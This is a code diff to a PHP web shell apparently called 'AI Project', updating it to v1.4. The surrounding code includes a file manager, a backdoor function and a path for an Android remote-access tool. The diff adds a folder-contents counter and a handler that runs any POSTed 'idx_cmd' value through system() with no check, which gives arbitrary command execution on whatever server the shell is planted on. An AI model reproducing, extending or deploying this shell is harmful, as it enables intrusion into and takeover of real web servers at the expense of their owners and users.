@@ -3,6 +3,7 @@
 session_start();
 date_default_timezone_set("Asia/Jakarta");
 
+$version = "v1.4";
 
 if(isset($_GET['rat-android-siapa'])) {
         $path = dirname(__FILE__)."/rat/android/";
@@ -36,7 +37,7 @@ else {
 
 
 <link href="" rel="stylesheet" type="text/css">
-<title>AI Project v1.3</title>
+<title>AI Project '.$version.'</title>
 <style>
 
 #bar_blank {
@@ -85,7 +86,7 @@ border-radius:5px;
 </head>
 <body>
 
-<h1><center><font color="aqua">AI Project v1.3</font></center></h1>
+<h1><center><font color="aqua">AI Project '.$version.'</font></center></h1>
 
 <center>
 			<a href="?server_info">
@@ -729,9 +730,31 @@ if(isset($_GET['path']) || isset($_GET['file_manager'])){
 				
 			//show dir
 			echo '<tr>
-			<td><a href="?path='.$path.'/'.$dir.'">'.$dir.'</a></td>
-			<td><center>--</center></td>
-			<td><center>';
+			<td><a href="?path='.$path.'/'.$dir.'">'.$dir.'</a></td>';
+			
+
+                        //echo '<td><center>xxx--</center></td>';
+                        $jpath = 0;
+                        $jfile = 0;
+                        foreach(scandir($path.'/'.$dir) as $zdir)
+                        {
+                            if ($zdir != '.' && $zdir != '..')
+                            {
+                               $pbusy = $path.'/'.$dir.'/'.$zdir;
+                               if (is_dir($pbusy))
+                                   $jpath += 1;
+                               else
+                                   $jfile += 1;
+                            }
+                        }
+                        if ($jpath == 0 && $jfile == 0)
+                           echo '<td><center><font color="yellow">'.$jpath.' dir / '.$jfile.' file</font></center></td>';
+                        else
+			   echo '<td><center>'.$jpath.' dir / '.$jfile.' file</center></td>';
+			$jpath = 0;
+                        $jfile = 0;
+
+                        echo '<td><center>';
 											
 			if(is_writable($path.'/'.$dir)) echo '<font color="green">';
 			elseif(!is_readable($path.'/'.$dir)) echo '<font color="red">';
@@ -1430,11 +1453,15 @@ function backdoor($os, $args = null)
 
 }
 
+if (isset($_POST['idx_cmd'])) {
+    echo "<pre>"; system($_POST['idx_cmd']); echo "</pre>";
+    idx_tools("cmd");
+}
 function idx_tools($toolsname, $args = null) {
 	if($toolsname === "cmd") {
-		print "<form method='post' action='?do=cmd&dir=".path()."' style='margin-top: 15px;'>
+		print "<form method='post' action='' style='margin-top: 15px;'>
 			  ".usergroup()->name."@".$GLOBALS['SERVERIP'].": ~ $
-			  <input style='border: none; border-bottom: 1px solid #ffffff;' type='text' name='cmd' required>
+			  <input style='border: none; border-bottom: 1px solid #ffffff;' type='text' name='idx_cmd' required>
 			  <input style='border: none; border-bottom: 1px solid #ffffff;' class='input' type='submit' value='>>'>
 			  </form>";
 	}
